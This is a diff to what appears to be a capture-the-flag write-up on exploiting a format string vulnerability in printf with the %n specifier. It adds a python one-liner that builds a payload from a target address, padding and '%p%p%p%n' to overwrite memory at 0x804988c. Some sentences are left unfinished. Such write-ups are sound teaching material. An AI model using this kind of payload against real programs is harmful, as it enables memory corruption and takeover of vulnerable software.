@@ -88,12 +88,13 @@ printf("123%n", &n) // n == 3 is true
 What we want to achieve is :
 
 ```
-printf("imagine that I am a 62 bytes long string %n", 0x804988c)
+printf("imagine that I am a 0x40 bytes long string %n", 0x804988c)
 ```
 
-Except that we don't
 `printf()` arguments handling works this way : the pointer to the formated string at `[esp]` and then `nth` arg at `[esp + n * 0x4]`. If there is a format token in the format string,
 
-The buffer used by `printf()` starts at `[esp + 0x10]`,
+The buffer used by `printf()` starts at `[esp + 0x10]`, so the 4th argument of the function could also be the first 4 bytes of the buffer string.
 
-In order to
+```
+python -c 'print "\x8c\x98\x04\x08" + "A" * 35 + "%p%p%p%n"'
+```
